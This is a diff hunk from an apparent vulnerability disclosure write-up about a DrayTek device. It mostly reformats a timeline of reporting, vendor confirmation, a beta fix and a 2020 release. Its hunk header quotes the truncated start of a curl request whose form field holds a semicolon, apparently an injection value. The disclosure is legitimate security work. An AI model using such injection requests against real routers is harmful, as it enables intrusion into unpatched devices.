@@ -25,8 +25,11 @@ curl -d "action=authusersms&custom1=1;&custom2=1&custom3=1&formuserphonenumber=a
 It's bug have been report to DrayTek,they confirm it and ask me to request CVE'id by myself acorrding to the github.
 
 04/12/2020 report vuln to DreyTek
+
 04/13/2020 DreyTek confirm it
+
 04/17/2020 DreyTek fixed it and give me a beta version
+
 06/18/2020 DreyTek release a new version.
 
 ![](./4.png)
